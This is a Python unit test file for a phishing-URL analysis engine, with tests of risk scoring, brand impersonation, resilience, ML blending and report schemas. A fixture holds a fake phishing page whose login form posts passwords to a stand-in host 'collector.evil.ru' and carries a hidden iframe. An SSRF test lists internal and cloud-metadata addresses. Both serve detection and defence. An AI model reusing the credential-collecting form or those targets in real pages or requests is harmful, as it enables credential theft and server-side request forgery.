import dataclasses
import json
import os
import tempfile
import time
import unittest

from analysis.config import AnalysisConfig
from analysis.engine import AnalysisEngine, Services
from analysis.http_fetch import FetchResult, SafeFetcher
from analysis.schema import SCHEMA_VERSION, validate_report
from features.url_features import InvalidUrlError
from tests._fakes import FakeDns, FakeFetcher, FakeRdap, services, valid_tls

PHISH_HTML = b'<title>PayPal - Log in</title><form action="https://collector.evil.ru/p"><input type="password"></form><iframe src="https://t.evil.ru" width="0" height="0"></iframe><script>eval(atob("x"))</script>'


def engine(cfg=None, svc=None, predictor=None):
    return AnalysisEngine(cfg or AnalysisConfig(), svc or services(), predictor)


class EngineScenarioTests(unittest.TestCase):
    def test_phishing_scenario(self):
        e = engine(svc=services(rdap=FakeRdap(age_days=3), fetcher=FakeFetcher(PHISH_HTML), tls=valid_tls(age_days=2)))
        r = e.analyze("https://paypa1-secure-login.xyz/verify")
        self.assertEqual(validate_report(r), [])
        self.assertIn(r["risk"]["level"], ("High", "Critical"))
        self.assertEqual(r["risk"]["category"], "Brand Impersonation")
        self.assertEqual({k: v["status"] for k, v in r["modules"].items()}, {"url": "ok", "homograph": "ok", "typosquatting": "ok", "domain": "ok", "tls": "ok", "website": "ok", "reputation": "ok", "brand": "ok", "ml": "skipped"})
        self.assertEqual(r["brand_impersonation"]["targets"][0]["brand"], "PayPal")
        fids = {f["id"] for f in r["risk"]["factors"]}
        self.assertTrue({"domain_very_new", "external_form_action", "hidden_iframe", "suspicious_scripts", "brand_impersonation", "risky_tld"} <= fids)
        sec = r["security_features"]
        self.assertEqual((sec["domain_age_days"], sec["has_password_field"], sec["external_form_action"], sec["tls_valid"], sec["dns_resolves"]), (3, 1.0, 1.0, 1.0, 1.0))
        self.assertIn("Do not enter credentials", [x["title"] for x in r["recommendations"]])
        self.assertEqual(r["threat_intelligence"][0]["provider"], "LocalHeuristics")

    def test_legitimate_brand_domain_scores_very_low(self):
        r = engine(svc=services(rdap=FakeRdap(age_days=9000), fetcher=FakeFetcher(b"<title>PayPal: Log in</title><form action='/signin'><input type='password'></form>"))).analyze("https://www.paypal.com/signin")
        self.assertEqual(validate_report(r), [])
        self.assertEqual((r["risk"]["level"], r["risk"]["category"], r["brand_impersonation"]["verified_brand_domain"]), ("Very Low", "Legitimate", "PayPal"))
        self.assertLessEqual(r["risk"]["score"], 10)

    def test_ordinary_site(self):
        r = engine().analyze("https://www.example.com/about")
        self.assertEqual((r["risk"]["level"], r["risk"]["factors"]), ("Very Low", []))
        self.assertEqual((r["url"]["registered_domain"], r["url"]["host"], r["url"]["is_ip"]), ("example.com", "www.example.com", False))

    def test_report_is_json_serialisable_and_versioned(self):
        r = engine().analyze("https://www.example.com/")
        self.assertEqual((r["schema_version"], json.loads(json.dumps(r))["risk"]["score"]), (SCHEMA_VERSION, r["risk"]["score"]))
        self.assertIsInstance(r["duration_ms"], int)

    def test_homograph_domain(self):
        r = engine().analyze("https://раураl.com/login")
        self.assertEqual(validate_report(r), [])
        self.assertTrue(r["homograph"]["is_suspicious"])
        self.assertIn(r["risk"]["level"], ("High", "Critical"))

    def test_ip_host_skips_dns_and_rdap(self):
        dns, rdap = FakeDns(), FakeRdap()
        r = engine(svc=services(dns=dns, rdap=rdap)).analyze("http://203.0.113.5/login")
        self.assertEqual((r["modules"]["domain"]["status"], dns.calls, rdap.calls), ("skipped", [], []))
        self.assertIn("ip_host", {f["id"] for f in r["risk"]["factors"]})

    def test_invalid_url_raises(self):
        for bad in ["javascript:alert(1)", "", "ftp://x.com", "http://"]:
            with self.assertRaises(InvalidUrlError):
                engine().analyze(bad)

    def test_blocklist_hit(self):
        f = os.path.join(tempfile.mkdtemp(), "bl.txt")
        with open(f, "w") as fh:
            fh.write("bad-site.example\n")
        r = engine(cfg=dataclasses.replace(AnalysisConfig(), blocklist_path=f)).analyze("https://bad-site.example/")
        self.assertIn("local_blocklist", {x["id"] for x in r["risk"]["factors"]})
        self.assertGreaterEqual(r["risk"]["score"], 55)
        self.assertTrue(any(t["provider"] == "LocalBlocklist" and t["is_known_malicious"] for t in r["threat_intelligence"]))


class EngineResilienceTests(unittest.TestCase):
    def test_a_crashing_module_does_not_break_the_report(self):
        r = engine(svc=services(dns=FakeDns(raises=RuntimeError("boom")))).analyze("https://www.example.com/")
        self.assertEqual(validate_report(r), [])
        self.assertEqual(r["modules"]["domain"]["status"], "partial")
        self.assertEqual(r["modules"]["website"]["status"], "ok")

    def test_everything_failing_still_returns_a_valid_report(self):
        bad = Services(dns=FakeDns(raises=RuntimeError("x")), rdap=FakeRdap(available=False), fetcher=FakeFetcher(results=[FetchResult(url="u", error="connection_failed")]), tls=lambda *a: (_ for _ in ()).throw(RuntimeError("tls")))
        r = engine(svc=bad).analyze("https://www.example.com/")
        self.assertEqual(validate_report(r), [])
        self.assertEqual({r["modules"][m]["status"] for m in ("tls", "website")}, {"failed"})

    def test_wall_clock_budget_is_enforced(self):
        cfg = dataclasses.replace(AnalysisConfig(), total_timeout=0.5)
        t = time.monotonic()
        r = engine(cfg=cfg, svc=services(fetcher=FakeFetcher(sleep=3.0))).analyze("https://www.example.com/")
        self.assertLess(time.monotonic() - t, 2.0)
        self.assertEqual((r["modules"]["website"]["status"], r["modules"]["website"]["error"]), ("failed", "timeout"))
        self.assertEqual(validate_report(r), [])

    def test_offline_mode_makes_no_network_calls(self):
        dns, rdap, fetcher = FakeDns(), FakeRdap(), FakeFetcher()
        r = engine(cfg=AnalysisConfig(enable_network=False), svc=services(dns=dns, rdap=rdap, fetcher=fetcher)).analyze("https://paypa1-login.xyz/")
        self.assertEqual((dns.calls, rdap.calls, fetcher.calls), ([], [], []))
        self.assertEqual([r["modules"][m]["status"] for m in ("domain", "tls", "website")], ["skipped"] * 3)
        self.assertEqual(validate_report(r), [])
        self.assertTrue(r["url_analysis"]["findings"] or r["brand_impersonation"]["targets"])  # offline checks still run

    def test_offline_http_url_still_reports_no_https(self):
        r = engine(cfg=AnalysisConfig(enable_network=False)).analyze("http://example.com/")
        self.assertEqual(r["tls_analysis"]["https"], False)

    def test_inspect_website_flag(self):
        fetcher = FakeFetcher()
        r = engine(svc=services(fetcher=fetcher)).analyze("https://www.example.com/", inspect_website=False)
        self.assertEqual((fetcher.calls, r["modules"]["website"]["status"]), ([], "skipped"))

    def test_scheme_less_input_tries_https_then_http(self):
        fetcher = FakeFetcher(results=[FetchResult(url="x", error="connection_failed")])
        r = engine(svc=services(fetcher=fetcher)).analyze("example.com/login")
        self.assertEqual(fetcher.calls, ["https://example.com/login", "http://example.com/login"])
        self.assertEqual(r["modules"]["website"]["status"], "ok")

    def test_ssrf_guard_applies_to_the_real_fetcher(self):
        cfg = AnalysisConfig(fetch_ports=(80, 8080))
        svc = Services(dns=FakeDns(), rdap=FakeRdap(), fetcher=SafeFetcher(cfg), tls=valid_tls())
        for target in ("http://127.0.0.1:8080/", "http://169.254.169.254/latest/meta-data/", "http://[::1]:8080/", "http://2130706433:8080/"):
            r = engine(cfg=cfg, svc=svc).analyze(target)
            self.assertEqual((r["modules"]["website"]["status"], r["modules"]["website"]["error"]), ("failed", "private_address"), target)


class EngineMlTests(unittest.TestCase):
    def test_ml_is_blended_when_available(self):
        calls = []

        def predictor(url, sec):
            calls.append(sec)
            return {"prediction": "phishing", "probability": 0.95, "confidence": 0.9, "top_features": [], "explanation": [], "model_version": "t-1", "explanation_method": "shap_tree"}
        r = engine(svc=services(rdap=FakeRdap(age_days=3), fetcher=FakeFetcher(PHISH_HTML)), predictor=predictor).analyze("https://paypa1-secure-login.xyz/verify")
        self.assertEqual((r["modules"]["ml"]["status"], r["risk"]["method"], r["ml"]["model_version"]), ("ok", "blended", "t-1"))
        self.assertEqual(calls[0]["domain_age_days"], 3)  # security features from the other modules are passed to the model
        self.assertNotIn("iframe_count", [k for k, v in calls[0].items() if v is None])  # unknown values are omitted, not sent as null
        self.assertTrue(all(v is not None for v in calls[0].values()))

    def test_predictor_failure_falls_back_to_heuristic(self):
        def boom(url, sec):
            raise RuntimeError("model crashed")
        r = engine(predictor=boom).analyze("https://www.example.com/")
        self.assertEqual((r["modules"]["ml"]["status"], r["ml"], r["risk"]["method"]), ("failed", None, "heuristic"))
        self.assertEqual(validate_report(r), [])

    def test_include_ml_false_and_no_model(self):
        called = []
        r = engine(predictor=lambda u, s: called.append(1)).analyze("https://www.example.com/", include_ml=False)
        self.assertEqual((called, r["modules"]["ml"]["status"]), ([], "skipped"))
        self.assertEqual(engine().analyze("https://www.example.com/")["modules"]["ml"], {"status": "skipped", "duration_ms": 0, "reason": "no_model"})


class SchemaValidatorTests(unittest.TestCase):
    def test_validator_catches_problems(self):
        r = engine().analyze("https://www.example.com/")
        self.assertEqual(validate_report(r), [])
        broken = dict(r)
        del broken["risk"]
        self.assertTrue(validate_report(broken))
        broken = {**r, "risk": {**r["risk"], "score": 101.5}}
        self.assertIn("risk.score must be an int 0-100", validate_report(broken))
        broken = {**r, "modules": {**r["modules"], "tls": {"status": "weird"}}}
        self.assertIn("modules.tls.status invalid", validate_report(broken))


if __name__ == "__main__":
    unittest.main()
